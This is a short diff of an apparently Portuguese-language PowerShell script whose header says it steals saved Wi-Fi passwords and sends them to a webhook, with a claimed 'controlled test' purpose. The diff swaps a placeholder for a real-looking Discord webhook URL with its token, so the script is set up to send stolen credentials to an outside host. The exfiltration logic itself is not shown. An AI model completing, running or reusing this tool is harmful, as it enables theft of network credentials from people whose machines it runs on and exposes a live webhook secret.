@@ -1,6 +1,6 @@
 # 🛰️ Exfiltra senhas Wi-Fi salvas e envia para um webhook (uso em ambiente de testes controlado)
 
-$dc = 'SEU_WEBHOOK_AQUI'
+$dc = 'https://discord.com/api/webhooks/1374570741902868561/97uADzd4ptueNxfzE-c0Gs1sNAGxsGjSAtFBjh_d_JNaPqONiFwCoWFtYrKGfr9MGpFF'
 $whuri = "$dc"
 
 # Deteção de encurtadores (opcional)
